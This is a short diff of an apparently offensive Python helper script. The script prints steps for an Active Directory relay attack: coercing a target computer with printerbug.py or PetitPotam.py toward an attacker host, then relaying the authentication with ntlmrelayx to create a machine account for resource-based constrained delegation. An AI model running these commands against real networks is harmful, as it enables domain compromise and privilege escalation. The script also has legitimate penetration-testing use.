@@ -96,7 +96,7 @@ def run():
   {Y}Terminal 2 — Trigger coercion from target computer:{RST}
   python3 printerbug.py '{dom}/{user}:{pw}@{target}.{dom}' {attacker}
   # or
-  python3 PetitPotam.py {attacker} {target}.{dom}
+  python3 tools/PetitPotam/PetitPotam.py {attacker} {target}.{dom}
 
   {Y}ntlmrelayx output:{RST}
   [+] RBCD attack: computer account NTLMRELAY$ created
